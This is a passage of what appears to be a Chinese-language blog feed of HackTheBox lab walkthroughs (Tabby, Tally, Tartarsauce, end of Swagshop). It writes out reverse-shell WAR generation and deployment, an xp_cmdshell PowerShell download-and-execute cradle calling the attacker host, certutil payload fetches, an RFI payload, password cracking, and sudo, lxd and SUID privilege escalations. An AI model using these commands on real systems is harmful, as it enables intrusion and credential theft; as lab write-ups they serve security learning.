<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现能以sudo运行vi在/var/www/html下</p>
<p><img src="/images/Swagshop/13.jpg" alt="13"></p>
<p>去<a href="https://gtfobins.github.io/#">gtfobins</a>搜索vi，发现了如下命令</p>
<p><img src="/images/Swagshop/15.jpg" alt="15"></p>
<p>修改一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &#39;:!&#x2F;bin&#x2F;sh&#39; </span><br></pre></td></tr></table></figure>

<p><img src="/images/Swagshop/14.jpg" alt="14"></p>
<p>成功提权</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Tabby</title>
    <url>/2020/09/24/HTB-Tabby/</url>
    <content><![CDATA[<h1 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h1><p>kali:10.10.16.10</p>
<p>目标:10.10.10.194</p>
<p>这个靶机不是很困难，但风格非常贴近于OSCP，思路清晰就会很快得到 initial shell</p>
<p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.194    megahosting.htb</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Tabby/1.png" alt="1"></p>
<p>发现了web服务和8080的tomcat</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先手动查看80的web服务，在检查页面功能的时候，就可以发现第一个可疑处，file传递的参数</p>
<p><img src="/images/Tabby/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试LFI</p>
<p><img src="/images/Tabby/3.png" alt="3"></p>
<p>看来这个LFI非常好利用，通常对于LFI，我们可以首先尝试读取一些敏感文件如/etc/shadow，如果该服务是root运行的，但这样的机会很少。<br>之后考虑读取/etc/passwd和/etc/ssh/sshd_config，获取普通用户的名称和ssh配置，如果<code>PasswordAuthentication yes</code>可以把爆破ssh列为最后的手段<br>之后考虑源码读取，可以考虑使用php修饰器或者直接包含文件</p>
<p>这里我们尝试直接包含常用web路径<code>/var/www/html</code>下已经发现的news.php</p>
<p><img src="/images/Tabby/4.png" alt="4"></p>
<p>发现页面是空的，直接查看源代码</p>
<p><img src="/images/Tabby/5.png" alt="5"></p>
<p>发现直接获取了源码，可以发现，这里仅仅是fopen，所以这里只是一个文件读取</p>
<p>既然是文件读取，我们可以利用它来获取一些已知服务的敏感信息，回到之前的端口扫描，发现了tomcat，如果能登录tomcat上传war，就可以直接获取shell了，之前已经接触过其他vulnhub，了解过tomcat存在一个存放凭据的文件tomcat-users.xml，我们先手动访问8080端口</p>
<p><img src="/images/Tabby/6.png" alt="6"></p>
<p>这里给出了提示tomcat-users.xml的路径，并且可以发现版本为tomcat9，读取该文件</p>
<p><img src="/images/Tabby/7.png" alt="7"></p>
<p>运气不是很好，没有能直接读到，这里比较坑，我先是考虑的权限问题，又考虑文件位置的问题，谷歌搜索给出的路径是</p>
<p><img src="/images/Tabby/8.png" alt="8"></p>
<p>尝试<code>/usr/share/tomcat9/conf/tomcat-users.xml</code>失败，最后实在没办法在本地apt安装了个tomcat9</p>
<p><img src="/images/Tabby/9.png" alt="9"></p>
<p>这地方浪费了一些时间，其实应该早点本地装一个，得到<code>/usr/share/tomcat9/etc/tomcat-users.xml</code></p>
<p><img src="/images/Tabby/10.png" alt="10"></p>
<p>终于获取凭证<code>tomcat/$3cureP4s5w0rd123!</code>，尝试登录<code>/manager/html</code>，但又遇到了麻烦</p>
<p><img src="/images/Tabby/11.png" alt="11"></p>
<p>无法登录原因在于当前用户的<code>roles</code>不在<code>manager-gui</code>，这就有点稍微棘手了<br>先尝试登录<code>/host-manager/html</code></p>
<p><img src="/images/Tabby/12.png" alt="12"></p>
<p>这个是可以登录的，尝试谷歌搜索<code>manager-script</code>渗透的方式，找到了两篇文章</p>
<p><a href="https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/">https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/</a><br><a href="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00">https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00</a>        适用</p>
<p>尝试getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.10 LPORT&#x3D;443 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>上传，这里和文章不同，用户名需要和密码需要使用单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; --upload-file evil.war &quot;http:&#x2F;&#x2F;10.10.10.194:8080&#x2F;manager&#x2F;text&#x2F;deploy?path&#x3D;&#x2F;foo&amp;update&#x3D;true&quot;</span><br></pre></td></tr></table></figure>

<p>得到了成功的回显</p>
<p><img src="/images/Tabby/14.png" alt="14"></p>
<p>可以再次确认一下，去<code>/manager/text/list</code>下查看</p>
<p><img src="/images/Tabby/13.png" alt="13"></p>
<p>现在访问shell即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;megahosting.htb:8080&#x2F;foo&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/15.png" alt="15"></p>
<p>终于获得了初始shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先通过发现机器存在普通用户<code>ash</code><br>linpeas扫描发现了一个在奇怪位置的备份文件，直接wget下载</p>
<p><img src="/images/Tabby/16.png" alt="16"></p>
<p>传输之后，发现该zip存在密码，直接爆破它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u 16162020_backup.zip</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/17.png" alt="17"></p>
<p>尝试使用ssh进行登录，凭据<code>ash/admin@it</code></p>
<p><img src="/images/Tabby/18.png" alt="18"></p>
<p>无法登录，不知道为什么，确实为<code>PasswordAuthentication yes</code><br>通过su切换过去，之前已经发现了，ash用户属于lxd组</p>
<p>搜索公开漏洞</p>
<p><img src="/images/Tabby/19.png" alt="19"></p>
<p>根据脚本提示，完成操作</p>
<ol>
<li>在kali中下载<code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code></li>
<li><code>bash build-alpine</code><br><img src="/images/Tabby/20.png" alt="20"></li>
</ol>
<p>得到一个压缩包</p>
<p><img src="/images/Tabby/21.png" alt="21"></p>
<ol start="3">
<li>将脚本和压缩包传输到目标机器</li>
</ol>
<p><img src="/images/Tabby/22.png" alt="22"></p>
<p>第一次运行会报错， /usr/bin/env: “bash\r”: 没有那个文件或目录</p>
<p>这主要是因为bash后面多了\r这个字符的原因。在linux终端下，输出\r会什么都不显示，只是把光标移到行首。于是终端虽然输出了/usr/bin/env bash，但是碰到\r后，光标会被移到行首，接着输出了:No such file or directory把前面的覆盖掉了。于是出现了那个莫名其妙的出错信息了</p>
<p>解决办法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用vim打开sh脚本文件， 重新设置文件的格式</span><br><span class="line">：set ff 然后回车 再重新设置下文件格式：</span><br><span class="line">：set ff&#x3D;unix 然后保存退出</span><br><span class="line">：wq! 回车</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/23.png" alt="23"></p>
<p>这样看起来没问题了</p>
<ol start="4">
<li>执行脚本</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;46978.sh -f alpine-v3.12-x86_64-20200924_0317.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/24.png" alt="24"></p>
<p>还是太菜了，主要是tomcat那里处理roles花了很多时间，最后获得root稍微有些曲折，应该仔细检查用户所处的组</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Tally</title>
    <url>/2020/07/02/HTB-Tally/</url>
    <content><![CDATA[<h1 id="Tally"><a href="#Tally" class="headerlink" title="Tally"></a>Tally</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE  SERVICE            VERSION</span><br><span class="line">21&#x2F;tcp    open   ftp                Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80&#x2F;tcp    open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS</span><br><span class="line">| http-ntlm-info: </span><br><span class="line">|   Target_Name: TALLY</span><br><span class="line">|   NetBIOS_Domain_Name: TALLY</span><br><span class="line">|   NetBIOS_Computer_Name: TALLY</span><br><span class="line">|   DNS_Domain_Name: TALLY</span><br><span class="line">|   DNS_Computer_Name: TALLY</span><br><span class="line">|_  Product_Version: 10.0.14393</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">81&#x2F;tcp    open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Bad Request</span><br><span class="line">136&#x2F;tcp   closed profile</span><br><span class="line">139&#x2F;tcp   open   netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open   microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">808&#x2F;tcp   open   ccproxy-http?</span><br><span class="line">1433&#x2F;tcp  open   ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: TALLY</span><br><span class="line">|   NetBIOS_Domain_Name: TALLY</span><br><span class="line">|   NetBIOS_Computer_Name: TALLY</span><br><span class="line">|   DNS_Domain_Name: TALLY</span><br><span class="line">|   DNS_Computer_Name: TALLY</span><br><span class="line">|_  Product_Version: 10.0.14393</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;SSL_Self_Signed_Fallback</span><br><span class="line">| Issuer: commonName&#x3D;SSL_Self_Signed_Fallback</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-07-03T00:46:59</span><br><span class="line">| Not valid after:  2050-07-03T00:46:59</span><br><span class="line">| MD5:   bc59 4f63 ebb7 2337 8f37 c4a7 af5e 9087</span><br><span class="line">|_SHA-1: 2a3d eb53 c19f 556f 7bed 8e3f 13c0 8f2e f3c0 239a</span><br><span class="line">|_ssl-date: 2020-07-03T01:19:55+00:00; -5s from scanner time.</span><br><span class="line">5985&#x2F;tcp  open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">15567&#x2F;tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">| http-ntlm-info: </span><br><span class="line">|   Target_Name: TALLY</span><br><span class="line">|   NetBIOS_Domain_Name: TALLY</span><br><span class="line">|   NetBIOS_Computer_Name: TALLY</span><br><span class="line">|   DNS_Domain_Name: TALLY</span><br><span class="line">|   DNS_Computer_Name: TALLY</span><br><span class="line">|_  Product_Version: 10.0.14393</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">32843&#x2F;tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">32844&#x2F;tcp open   ssl&#x2F;http           Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;SharePoint Services&#x2F;organizationName&#x3D;Microsoft&#x2F;countryName&#x3D;US</span><br><span class="line">| Subject Alternative Name: DNS:localhost, DNS:tally</span><br><span class="line">| Issuer: commonName&#x3D;SharePoint Root Authority&#x2F;organizationName&#x3D;Microsoft&#x2F;countryName&#x3D;US</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2017-09-17T22:51:16</span><br><span class="line">| Not valid after:  9999-01-01T00:00:00</span><br><span class="line">| MD5:   965f 55d6 a0b1 fed5 4ce5 3887 2938 0d53</span><br><span class="line">|_SHA-1: 0f6a 3c08 bee8 b7ad 237e 9759 e91c f683 8f0b 149f</span><br><span class="line">|_ssl-date: 2020-07-03T01:19:55+00:00; -5s from scanner time.</span><br><span class="line">| tls-alpn: </span><br><span class="line">|   h2</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">32846&#x2F;tcp open   storagecraft-image StorageCraft Image Manager</span><br><span class="line">47001&#x2F;tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49665&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49666&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49667&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49668&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49669&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49670&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<p>扫描出了大量端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试枚举21，不允许匿名登录<br>尝试枚举smb，也不允许访客登录</p>
<p>用特殊的字典扫描SharePoint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;CMS&#x2F;sharepoint.txt -u http:&#x2F;&#x2F;10.10.10.59&#x2F; -o &#x2F;root&#x2F;Desktop&#x2F;dir.txt</span><br></pre></td></tr></table></figure>

<p>之后会发现url <code>10.10.10.59/_layouts/15/viewlsts.aspx</code><br>并且在documents和site pages里提示</p>
<p><img src="/images/Tally/1.jpg" alt="1"></p>
<p>在documents里发现</p>
<p><img src="/images/Tally/2.jpg" alt="2"></p>
<p>下载下来</p>
<p><img src="/images/Tally/3.jpg" alt="3"></p>
<p>我们成功获取了ftp的密码</p>
<p><img src="/images/Tally/4.jpg" alt="4"></p>
<p>在site pages里发现了ftp用户名</p>
<p>现在得到ftp账户密码 <code>ftp_user/UTDRSCH53c&quot;$6hys</code></p>
<p>直接把ftp里所有文件下载下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror &#39;ftp:&#x2F;&#x2F;ftp_user:UTDRSCH53c&quot;$6hys@10.10.10.59&#39;</span><br></pre></td></tr></table></figure>

<p>下载同时手动找一找，看看能发现什么</p>
<p><img src="/images/Tally/5.jpg" alt="5"></p>
<p>在<code>User/Tim/Files</code>里发现kdbx，下载下来<br>注意，这是一个二进制文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binary</span><br><span class="line">get tim.kdbx</span><br></pre></td></tr></table></figure>

<p>尝试破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keepass2john .&#x2F;tim.kdbx &gt; hash.txt</span><br><span class="line">john --format&#x3D;keepass hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/6.jpg" alt="6"></p>
<p><img src="/images/Tally/7.jpg" alt="7"></p>
<p>成功破解，密钥<code>simplementeyo</code></p>
<p><img src="/images/Tally/8.jpg" alt="8"></p>
<p><img src="/images/Tally/9.jpg" alt="9"></p>
<p>成功发现两个账户和密码</p>
<p><code>Finance/Acc0unting</code><br><code>cisco/cisco123</code></p>
<p>尝试枚举smb</p>
<p><img src="/images/Tally/10.jpg" alt="10"></p>
<p>发现成功登录</p>
<p>直接挂载到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount &#x2F;&#x2F;10.10.10.59&#x2F;ACCT &#x2F;tmp -o username&#x3D;Finance,password&#x3D;Acc0unting</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/11.jpg" alt="11"></p>
<p>发现文件<code>zz_Migration/Binaries/New folder/tester.exe</code><br>查看tester.exe中存在的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings tester.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/12.jpg" alt="12"></p>
<p>成功发现数据库用户和密码<code>sa/GWE3V65#6KFH93@4GWTG2G</code><br>而且对方sql server端口对外开放，可以直接登录</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G</span><br></pre></td></tr></table></figure>

<p>不过对方xp_cmdshell函数没开启，需要手动打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;, &#39;1&#39;</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">EXEC SP_CONFIGURE &#39;xp_cmdshell&#39;, 1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/13.jpg" alt="13"></p>
<p>直接弹个powershell回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xp_cmdshell &quot;Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot;</span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/14.jpg" alt="14"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传输提权脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;winpeas.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/15.jpg" alt="15"></p>
<p>可以使用juicypotato</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;JuicyPotato.exe</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;evil.bat</span><br></pre></td></tr></table></figure>

<p>evil.bat是弹powershell的命令<br>而且我们发现机器是win server 2016，直接去找<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">CLSID</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\public\JuicyPotato.exe -t * -p C:\Users\public\evil.bat -l 3333 -c &#39;&#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/16.jpg" alt="16"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Tartarsauce</title>
    <url>/2020/06/26/HTB-Tartarsauce/</url>
    <content><![CDATA[<h1 id="Tartarsauce"><a href="#Tartarsauce" class="headerlink" title="Tartarsauce"></a>Tartarsauce</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Tartarsauce/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先目录扫描发现了目录webservices，再在webservices目录里进行目录扫描，终于发现了应用wordpress</p>
<p><img src="/images/Tartarsauce/2.jpg" alt="2"></p>
<p>不过打开后页面无法显示</p>
<p><img src="/images/Tartarsauce/3.jpg" alt="3"></p>
<p>原因来源于绝对路径的错误，少个/，使用burp进行修复<br>提娜佳以下response header和response body就行</p>
<p><img src="/images/Tartarsauce/4.jpg" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>既然已经知道目标在运行wp，先用wpscan扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token abcdefg --url http:&#x2F;&#x2F;10.10.10.88&#x2F;webservices&#x2F;wp&#x2F; -e p --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tartarsauce/5.jpg" alt="5"></p>
<p>发现插件gwolle，搜索公开漏洞</p>
<p><img src="/images/Tartarsauce/8.jpg" alt="8"></p>
<p><img src="/images/Tartarsauce/6.jpg" alt="6"></p>
<p>该漏洞是个RFI漏洞，会包含一个<code>wp-load.php</code>文件，且不要指定路径<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.88&#x2F;webservices&#x2F;wp&#x2F;wp-content&#x2F;plugins&#x2F;gwolle-gb&#x2F;frontend&#x2F;captcha&#x2F;ajaxresponse.php?abspath&#x3D;http:&#x2F;&#x2F;10.10.16.100&#x2F;</span><br></pre></td></tr></table></figure>

<p>注意，我们要关闭apache服务，因为我们的apache服务是带有php环境，这回让我们拿到自己的shell…..所以需要开启另一个http服务不带php环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;var&#x2F;www&#x2F;html#python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tartarsauce/9.jpg" alt="9"></p>
<p>成功获取shell</p>
<p>升级shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br><span class="line">export TERM&#x3D;xterm-color</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Tartarsauce/10.jpg" alt="10"></p>
<p>发现onuma能够sudo执行tar命令，可以利用tar切换到他的shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u onuma tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>之后在该账户下发现了一个定时任务</p>
<p><img src="/images/Tartarsauce/11.jpg" alt="11"></p>
<p>搜索改文件</p>
<p><img src="/images/Tartarsauce/12.jpg" alt="12"></p>
<p>查看/usr/sbin/backuperer是一个定时任务的shell脚本，分析它的行为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">bkpdir&#x3D;&#x2F;var&#x2F;backups</span><br><span class="line">tmpdir&#x3D;&#x2F;var&#x2F;tmp</span><br><span class="line">testmsg&#x3D;$bkpdir&#x2F;onuma_backup_test.txt</span><br><span class="line">errormsg&#x3D;$bkpdir&#x2F;onuma_backup_error.txt</span><br><span class="line">tmpfile&#x3D;$tmpdir&#x2F;.$(&#x2F;usr&#x2F;bin&#x2F;head -c100 &#x2F;dev&#x2F;urandom |sha1sum|cut -d&#39; &#39; -f1)</span><br><span class="line">check&#x3D;$tmpdir&#x2F;check</span><br><span class="line"></span><br><span class="line"># formatting</span><br><span class="line">printbdr()</span><br><span class="line">&#123;</span><br><span class="line">    for n in $(seq 72);</span><br><span class="line">    do &#x2F;usr&#x2F;bin&#x2F;printf $&quot;-&quot;;</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line">bdr&#x3D;$(printbdr)</span><br><span class="line"></span><br><span class="line"># Added a test file to let us see when the last backup was run</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;printf $&quot;$bdr\nAuto backup backuperer backup last ran at : $(&#x2F;bin&#x2F;date)\n$bdr\n&quot; &gt; $testmsg</span><br><span class="line"></span><br><span class="line"># Cleanup from last time.</span><br><span class="line">&#x2F;bin&#x2F;rm -rf $tmpdir&#x2F;.* $check</span><br><span class="line"></span><br><span class="line"># Backup onuma website dev files.</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo -u onuma &#x2F;bin&#x2F;tar -zcvf $tmpfile $basedir &amp;</span><br><span class="line"></span><br><span class="line"># Added delay to wait for backup to complete if large files get added.</span><br><span class="line">&#x2F;bin&#x2F;sleep 30</span><br><span class="line"></span><br><span class="line"># Test the backup integrity</span><br><span class="line">integrity_chk()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;usr&#x2F;bin&#x2F;diff -r $basedir $check$basedir</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;mkdir $check</span><br><span class="line">&#x2F;bin&#x2F;tar -zxvf $tmpfile -C $check</span><br><span class="line">if [[ $(integrity_chk) ]]</span><br><span class="line">then</span><br><span class="line">    # Report errors so the dev can investigate the issue.</span><br><span class="line">    &#x2F;usr&#x2F;bin&#x2F;printf $&quot;$bdr\nIntegrity Check Error in backup last ran :  $(&#x2F;bin&#x2F;date)\n$bdr\n$tmpfile\n&quot; &gt;&gt; $errormsg</span><br><span class="line">    integrity_chk &gt;&gt; $errormsg</span><br><span class="line">    exit 2</span><br><span class="line">else</span><br><span class="line">    # Clean up and save archive to the bkpdir.</span><br><span class="line">    &#x2F;bin&#x2F;mv $tmpfile $bkpdir&#x2F;onuma-www-dev.bak</span><br><span class="line">    &#x2F;bin&#x2F;rm -rf $check .*</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>这个shell的行为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">压缩&#x2F;var&#x2F;www&#x2F;html的文件到&#x2F;var&#x2F;tmp&#x2F;文件名为随机 存活30秒</span><br><span class="line">创建文件夹&#x2F;var&#x2F;tmp&#x2F;check</span><br><span class="line">解压 随机名 压缩包到&#x2F;var&#x2F;tmp&#x2F;check</span><br><span class="line">对比&#x2F;var&#x2F;www&#x2F;html 和 &#x2F;var&#x2F;tmp&#x2F;check&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">对比会失败，创建backup</span><br><span class="line">程序结束，删除&#x2F;var&#x2F;tmp&#x2F;check</span><br></pre></td></tr></table></figure>

<p>我们的目标是在30秒内，替换掉随机的压缩包</p>
<p>首先使用SUID搞定rootshell的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main ( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        setreuid(0,0);</span><br><span class="line">        execve(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译<br>对方机器32位，需要安装gcc-multilib，编译指定-m32</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -o evil evil.c</span><br></pre></td></tr></table></figure>

<p>创建对比的文件，目录一定要写对/var/www/html</p>
<p><img src="/images/Tartarsauce/14.jpg" alt="14"></p>
<p>传输过去，到对面的/var/tmp</p>
<p>等待倒数到0，监控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl list-timers</span><br><span class="line">watch -n 1 &#39;systemctl list-timers&#39;</span><br></pre></td></tr></table></figure>

<p>到0后覆盖掉随机文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp evil.tar.gz .c10da7f00a2d034bac1b50a327290c6ada94e</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tartarsauce/15.jpg" alt="15"></p>
<p>之后等到30秒</p>
<p>进入check目录即可获取root</p>
<p><img src="/images/Tartarsauce/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
